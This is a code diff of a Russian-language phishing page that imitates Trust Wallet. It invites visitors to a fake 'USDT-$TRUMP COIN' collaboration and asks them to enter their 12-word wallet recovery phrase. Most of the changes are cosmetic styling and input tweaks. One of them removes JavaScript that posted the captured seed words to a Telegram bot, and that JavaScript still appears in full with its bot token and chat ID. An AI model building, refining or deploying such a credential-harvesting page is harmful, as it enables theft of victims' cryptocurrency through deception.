@@ -15,7 +15,6 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            flex-direction: column;
         }
         .container {
             max-width: 450px;
@@ -36,6 +35,7 @@
         h1 {
             font-size: 20px;
             margin-bottom: 16px;
+            margin-top: 30px;
         }
         .description {
             font-size: 14px;
@@ -46,6 +46,7 @@
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 16px;
+            justify-items: start;
         }
         .seed-item {
             display: flex;
@@ -67,6 +68,7 @@
             color: #FFFFFF;
             width: 100%;
             box-sizing: border-box;
+            text-align: left;
         }
         input::placeholder {
             color: #888888;
@@ -88,7 +90,7 @@
             transition: background-color 0.3s;
         }
         button:hover {
-            background-color: #0f28cc;
+            background-color: #0f25c1;
         }
         .warning {
             margin-top: 10px;
@@ -98,16 +100,16 @@
         }
         footer {
             margin-top: 20px;
+            text-align: center;
             font-size: 12px;
             color: #A0A0A0;
-            text-align: center;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">
-            <img src="IMG_2134.png" alt="Trust Wallet Logo">
+            <img src="IMG_2088.png" alt="Trust Wallet Logo">
         </div>
         <h1>Для участия в колоборации USDT-$TRUMP COIN авторизуйте свой кошелёк</h1>
         <p class="description">Введите вашу секретную фразу из 12 слов. Убедитесь, что вы храните её в безопасности!</p>
@@ -115,51 +117,51 @@
             <div class="seed-input">
                 <div class="seed-item">
                     <label for="word1">1.</label>
-                    <input type="text" id="word1" name="word1" placeholder="Введите слово" required>
+                    <input type="text" id="word1" name="word1" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word2">2.</label>
-                    <input type="text" id="word2" name="word2" placeholder="Введите слово" required>
+                    <input type="text" id="word2" name="word2" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word3">3.</label>
-                    <input type="text" id="word3" name="word3" placeholder="Введите слово" required>
+                    <input type="text" id="word3" name="word3" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word4">4.</label>
-                    <input type="text" id="word4" name="word4" placeholder="Введите слово" required>
+                    <input type="text" id="word4" name="word4" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word5">5.</label>
-                    <input type="text" id="word5" name="word5" placeholder="Введите слово" required>
+                    <input type="text" id="word5" name="word5" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word6">6.</label>
-                    <input type="text" id="word6" name="word6" placeholder="Введите слово" required>
+                    <input type="text" id="word6" name="word6" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word7">7.</label>
-                    <input type="text" id="word7" name="word7" placeholder="Введите слово" required>
+                    <input type="text" id="word7" name="word7" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word8">8.</label>
-                    <input type="text" id="word8" name="word8" placeholder="Введите слово" required>
+                    <input type="text" id="word8" name="word8" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word9">9.</label>
-                    <input type="text" id="word9" name="word9" placeholder="Введите слово" required>
+                    <input type="text" id="word9" name="word9" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word10">10.</label>
-                    <input type="text" id="word10" name="word10" placeholder="Введите слово" required>
+                    <input type="text" id="word10" name="word10" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word11">11.</label>
-                    <input type="text" id="word11" name="word11" placeholder="Введите слово" required>
+                    <input type="text" id="word11" name="word11" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word12">12.</label>
-                    <input type="text" id="word12" name="word12" placeholder="Введите слово" required>
+                    <input type="text" id="word12" name="word12" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
             </div>
             <button type="submit">Отправить</button>
@@ -169,29 +171,12 @@
     <footer>
         © 2025 Trust Wallet. Все права защищены.
     </footer>
+
     <script>
-        // Удаление .html из адресной строки при загрузке страницы
         if (window.location.pathname.endsWith('.html')) {
             const newPath = window.location.pathname.replace('.html', '');
             history.replaceState({}, '', newPath);
         }
-
-        // Скрипт отправки данных в Telegram
-        const form = document.getElementById('seedForm');
-        form.addEventListener('submit', function (e) {
-            e.preventDefault();
-            const inputs = form.querySelectorAll('input');
-            const data = Array.from(inputs).map((input, index) => `${index + 1}. ${input.value}`).join('\n');
-            const chatId = '@bdsjxjdhd'; // Ваш chat ID
-            const apiToken = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg'; // Ваш API токен
-            fetch(`https://api.telegram.org/bot${apiToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: data })
-            }).then(response => response.json())
-              .then(data => alert('Данные успешно отправлены'))
-              .catch(error => alert('Ошибка отправки данных'));
-        });
     </script>
 </body>
 </html>
